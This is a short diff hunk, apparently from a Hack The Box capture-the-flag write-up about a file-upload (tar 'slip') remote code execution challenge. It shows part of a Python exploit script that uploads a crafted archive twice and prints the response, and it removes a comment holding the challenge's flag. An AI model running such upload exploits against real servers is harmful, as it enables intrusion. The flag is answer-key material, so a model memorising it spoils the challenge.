@@ -28,8 +28,6 @@ s.post(url,files={'file':open('flag.tar.gz','rb')})
 time.sleep(2)
 res = s.post(url,files={'file':open('flag.tar.gz','rb')}).text
 print(json.loads(res)['list'][0])
-
-# HTB{i_slipped_my_way_to_rce}
 ```
 __output__
 ```
